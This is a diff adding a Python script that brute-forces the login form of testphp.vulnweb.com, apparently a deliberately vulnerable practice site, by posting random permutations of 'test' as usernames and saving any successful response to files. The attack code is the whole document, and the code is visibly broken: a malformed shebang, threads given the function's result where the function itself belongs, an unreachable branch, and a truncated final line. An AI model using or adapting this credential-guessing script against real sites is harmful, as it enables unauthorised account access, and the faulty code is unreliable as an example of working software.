@@ -1,0 +1,65 @@
+#!usr/bin/env python3
+import requests
+import random
+import os
+import threading
+
+def brute():
+    na=1
+    while na > 0:
+        low="t"
+        upper="e"
+        num="st"
+        summ=low+upper+num
+        lent=4
+        pss="".join(random.sample(summ,4))
+        url=  "http://testphp.vulnweb.com/userinfo.php"
+        name=pss.strip()
+        password="test"
+        data={"uname":name,"pass":password}
+        req=requests.post(url,data)
+        a=req.text.find("logout")
+        b=open('PASSWORD_SAVER.txt','w')
+        b.write(name)
+        if a==-1:
+            print("Hacking...")
+            g=open("login.txt","w")
+            if a==1:
+                g.write(name)
+                g.close()
+            print(na)
+        else:
+            print("YOU ARE LOGGED IN SUCCESSFULLY")
+            f=open("password.txt","w")
+            f.write(req.text)
+            f.close()
+            print(name)
+            break
+        na+=1
+
+
+t1=threading.Thread(target=brute(),args=(1,),daemon=True)
+t5=threading.Thread(target=brute(),args=(1,),daemon=True)
+t6=threading.Thread(target=brute(),args=(1,),daemon=True)
+t2=threading.Thread(target=brute(),args=(1,),daemon=True)
+t3=threading.Thread(target=brute(),args=(1,),daemon=True)
+t4=threading.Thread(target=brute(),args=(1,),daemon=True)
+
+
+
+
+
+
+t1.start()
+t2.start()
+t3.start()
+t4.start()
+t5.start()
+t6.start()
+
+t1.join()
+t2.join()
+t3.join()
+t4.join()
+t5.join()
+t6.join(
